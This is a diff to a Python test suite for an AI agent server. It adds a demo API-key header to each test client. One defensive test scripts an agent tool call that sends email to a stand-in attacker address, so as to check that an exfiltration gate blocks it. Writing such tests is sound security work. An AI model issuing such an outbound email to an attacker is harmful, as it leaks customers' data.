@@ -14,7 +14,7 @@ from src.providers.fake import FakeProvider
 
 
 def test_healthz_liveness():
-    with TestClient(server.app) as client:
+    with TestClient(server.app, headers={"X-API-Key": "demo-agent-key"}) as client:
         r = client.get("/healthz")
         assert r.status_code == 200 and r.json()["status"] == "ok"
 
@@ -26,7 +26,7 @@ def test_run_endpoint_gate_blocks_exfil():
         [("send_email", {"to": ATTACKER_EMAIL, "subject": "확인", "body": "고객 안내"})],
         "처리했습니다.",
     ])
-    with TestClient(server.app) as client:
+    with TestClient(server.app, headers={"X-API-Key": "demo-agent-key"}) as client:
         server.set_provider(provider)          # lifespan 이후 주입(실 provider 오버라이드)
         r = client.post("/v1/agent/run", json={"input": "환불 처리 방법 알려주세요"})
         assert r.status_code == 200, r.text
@@ -48,7 +48,7 @@ def test_dlp_tier_a_allows_legit_customer_email():
         [("send_email", {"to": "<EMAIL_1>", "subject": "환불 안내", "body": "처리되었습니다"})],
         "이메일을 발송했습니다.",
     ])
-    with TestClient(server.app) as client:
+    with TestClient(server.app, headers={"X-API-Key": "demo-agent-key"}) as client:
         server.set_provider(provider)
         r = client.post("/v1/agent/run", json={"input": "고객에게 환불 안내 이메일을 보내주세요"})
         assert r.status_code == 200, r.text
@@ -64,7 +64,7 @@ def test_run_endpoint_normal_task_completes():
         [("lookup_customer", {"phone": "010-1234-5678"})],
         "고객 정보를 확인했습니다.",
     ])
-    with TestClient(server.app) as client:
+    with TestClient(server.app, headers={"X-API-Key": "demo-agent-key"}) as client:
         server.set_provider(provider)
         r = client.post("/v1/agent/run", json={"input": "고객 정보를 조회해 주세요"})
         assert r.status_code == 200, r.text
@@ -75,7 +75,7 @@ def test_run_endpoint_normal_task_completes():
 
 def test_run_rejects_empty_input():
     """입력 검증 — 빈 입력은 422."""
-    with TestClient(server.app) as client:
+    with TestClient(server.app, headers={"X-API-Key": "demo-agent-key"}) as client:
         server.set_provider(FakeProvider.scripted(["x"]))
         r = client.post("/v1/agent/run", json={"input": ""})
         assert r.status_code == 422
